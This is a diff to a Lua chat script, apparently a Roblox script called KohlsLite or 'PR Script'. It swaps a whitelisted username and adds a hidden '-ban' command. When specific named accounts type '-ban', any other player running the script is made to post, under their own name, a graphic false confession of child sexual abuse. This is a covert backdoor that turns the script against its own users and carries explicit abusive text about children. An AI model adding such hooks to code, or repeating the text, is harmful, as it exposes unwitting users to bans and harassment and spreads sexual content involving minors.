@@ -4637,7 +4637,7 @@ v.Chatted:Connect(function(msg)
                         Speak("[KohlsLite]: I use KohlsLite!")
                 end
 
-                if string.sub(msg:lower(), 0, 5) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "Di33le2") then
+                if string.sub(msg:lower(), 0, 5) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "G_ODt") then
 			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
 	                 	Speak("[PR Script]: I use PR Script!")
 			end
@@ -4661,6 +4661,12 @@ v.Chatted:Connect(function(msg)
                 if string.sub(msg:lower(), 0, 5) == "-warn" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "3cxos" or v.Name == "Dekryptionite" or v.Name == "Di33le2") then
                     	if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
 				Remind("[PR Script]: You Have Been Warned! ~atprog")
+			end
+                end
+
+if string.sub(msg:lower(), 0, 5) == "-ban" and v.Name ~= game.Players.LocalPlayer.Name and (v.Name == "atprog" or v.Name == "IceStuds") then
+			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
+	                 	Speak("i rape lil kids and i fuck their little asshole so hard")
 			end
                 end
 
